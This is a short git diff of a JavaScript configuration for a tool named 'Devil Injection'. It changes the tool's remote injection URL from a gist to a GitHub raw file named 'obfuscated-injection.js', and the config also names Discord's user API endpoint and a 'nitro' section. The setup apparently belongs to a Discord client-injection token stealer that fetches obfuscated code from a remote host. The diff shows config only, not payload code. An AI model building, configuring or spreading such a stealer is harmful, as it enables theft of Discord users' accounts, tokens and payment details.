@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Devil Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1203323972398219339/1203338921518571551/devil.gif?ex=65d0bbb3&is=65be46b3&hm=9d1ffd5cd449208d9e105f424fe4f77e5e6df30f2f3f1e03f8fcab3fbc41e6dd&'.replace(/ /g, '%20'),
   embed_color: ff0000, 
-  injection_url: 'https://gist.githubusercontent.com/troleksiema/b9ec4273898195b8e87ff30d7d55bf86/raw/f5e9517d7f9290d87ad7f0d426df565b93fd9671/obfuscated-injection.js', 
+  injection_url: 'hhttps://raw.githubusercontent.com/troleksiema/Devil-injection/main/obfuscated-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
